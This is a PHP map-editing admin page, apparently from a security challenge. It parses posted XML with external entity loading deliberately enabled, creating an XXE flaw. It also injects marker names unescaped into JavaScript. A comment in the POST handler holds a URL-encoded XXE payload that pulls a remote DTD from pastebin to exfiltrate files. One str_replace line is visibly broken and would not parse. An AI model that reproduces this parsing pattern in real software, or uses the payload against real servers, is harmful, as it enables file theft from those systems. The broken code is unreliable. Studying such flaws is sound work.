<?php
include_once "includes/session.php";
?>
<!DOCTYPE html>
<html lang="en">
<?php include_once "../includes/header.php"; ?>

<body>
    <?php include_once "../includes/menu.php"; ?>

    <header class="hero bg-primary text-white text-center py-5">
        <div class="container">
            <h1>Edit map</h1>
            <p>Dev-Note: Please note editing map globally is currently not possible! We are working on it.<br>You can
                use this site to test out the coordinates for now.</p>
            <form method="post" action="/admin/map.php">
                <div class="form-group">
                    <textarea class="form-control" name="data"
                        rows="7"><?php $xmlFilePath = "./data.example";
                        echo file_get_contents($xmlFilePath); ?></textarea>
                </div>
                <br>
                <button type="submit" class="btn btn-light btn-lg">Submit</button>
            </form>
        </div>
    </header>

    <section id="map" class="py-5">
        <div class="container">
            <div class="panel panel-default">
                <div class="panel-body">
                    <div class="card header">
                        <div class="card-body">
                            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
                            <div id="map" style="height: 500px;" />
                            <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
                            <script>
                                var map = L.map('map').setView([0, 0], 12);
                                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors' }).addTo(map);
                                <?php
                                function parseXML($xmlData)
                                {
                                    try {
                                        libxml_disable_entity_loader(false);
                                        $xml = simplexml_load_string($xmlData, 'SimpleXMLElement', LIBXML_NOENT);
                                        return $xml;
                                    } catch (Exception $ex) {
                                        return false;
                                    }
                                    return true;
                                }

                                try {
                                    $xmlData = "";
                                    if ($_SERVER["REQUEST_METHOD"] === "POST") {
                                        // https://pastebin.com/raw/bBPJ4z09
                                        // %3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%3f%3e%0d%0a%3c%21%44%4f%43%54%59%50%45%20%72%20%5b%0d%0a%3c%21%45%4c%45%4d%45%4e%54%20%72%20%41%4e%59%20%3e%0d%0a%3c%21%45%4e%54%49%54%59%20%25%20%73%70%20%53%59%53%54%45%4d%20%22%68%74%74%70%73%3a%2f%2f%70%61%73%74%65%62%69%6e%2e%63%6f%6d%2f%72%61%77%2f%53%73%41%34%39%59%6d%51%22%3e%0d%0a%25%73%70%3b%0d%0a%25%70%61%72%61%6d%31%3b%0d%0a%5d%3e%0d%0a%3c%72%3e%26%65%78%66%69%6c%3b%3c%2f%72%3e
                                        $xmlData = $_POST["data"];
                                        if (!parseXML($xmlData))
                                            $xmlData = "";
                                    }
                                    if ($xmlData === "") {
                                        $xmlData = file_get_contents($xmlFilePath);
                                    }
                                    $xml = parseXML($xmlData);
                                    foreach ($xml->marker as $marker) {
                                        $name = str_replace("", "\", $marker->name);
                                        echo 'L.marker(["' . $marker->lat . '", "' . $marker->lon . '"]).addTo(map).bindPopup("' . $name . '").openPopup();' . "";
                                        echo 'map.setView(["' . $marker->lat . '", "' . $marker->lon . '"], 9);' . "";
                                    }
                                } catch (Exception $ex) {
                                    echo "Invalid xml data!";
                                }
                                ?>
                            </script>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </div>
    </section>
</body>

</html>